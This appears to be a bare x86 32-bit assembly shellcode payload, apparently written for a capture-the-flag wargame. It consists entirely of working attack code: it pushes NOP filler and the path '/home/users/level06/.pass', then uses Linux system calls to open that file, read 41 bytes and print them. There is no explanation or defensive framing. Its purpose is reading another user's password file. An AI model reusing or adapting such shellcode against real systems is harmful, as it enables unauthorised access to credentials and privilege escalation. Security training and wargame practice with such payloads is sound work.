
bits 32

section .text
	global _start

_start:
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x00000073	;    s
	push 0x7361702e ; sap.
	push 0x2f2f3630 ; /60l
	push 0x6c657665 ; evel
	push 0x6c2f7372 ; /sre
	push 0x6573752f ; su/s
	push 0x656d6f68 ; emoh
	push 0x2f2f2f2f ; ////

    xor eax, eax
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0x5
    mov dl, 1
    int 0x80
    mov ebx, eax

    xor eax, eax
    mov ecx, esp
    mov dl, 41
    mov al, 0x3
    int 0x80

    mov al, 0x4
    mov bl, 0x1
    mov dl, 41
    mov ecx, esp
    int 0x80

    mov al, 0x1
    int 0x80